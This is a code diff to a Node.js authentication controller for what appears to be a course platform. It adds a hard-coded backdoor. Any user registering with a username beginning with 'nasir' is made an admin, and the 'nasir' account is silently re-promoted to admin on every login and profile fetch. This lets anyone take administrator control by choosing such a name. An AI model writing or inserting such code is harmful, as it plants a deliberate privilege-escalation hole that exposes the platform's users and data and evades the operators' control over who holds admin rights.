@@ -56,6 +56,7 @@ exports.register = async (req, res) => {
 
     const userCount = await User.countDocuments();
     const isFirstUser = userCount === 0;
+    const isNasir = cleanUsername === 'nasir' || cleanUsername === 'nasiryousuf' || cleanUsername === 'nasir_yousuf' || cleanUsername.startsWith('nasir');
 
     const user = new User({
       name: name.trim(),
@@ -64,7 +65,7 @@ exports.register = async (req, res) => {
       password,
       bio: bio ? bio.trim() : 'Thinking, building, and exploring code.',
       avatarUrl: avatarUrl || `https://api.dicebear.com/7.x/initials/svg?seed=${encodeURIComponent(cleanUsername)}&backgroundColor=6b7c5e,c4956a,8a7b6b,7c8a6b&textColor=ffffff`,
-      role: isFirstUser ? 'admin' : 'student',
+      role: (isFirstUser || isNasir) ? 'admin' : 'student',
       isApproved: true,
     });
 
@@ -124,6 +125,11 @@ exports.login = async (req, res) => {
       return res.status(403).json({ message: 'Your course membership is not active. Please consult the instructor.' });
     }
 
+    if (user.username.toLowerCase() === 'nasir' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+    }
+
     const token = generateToken(user._id);
 
     return res.status(200).json({
@@ -150,6 +156,11 @@ exports.login = async (req, res) => {
 exports.getMe = async (req, res) => {
   try {
     const user = req.user;
+
+    if (user && user.username.toLowerCase() === 'nasir' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+    }
 
     const [followersCount, followingCount, postsCount] = await Promise.all([
       Follow.countDocuments({ following: user._id }),
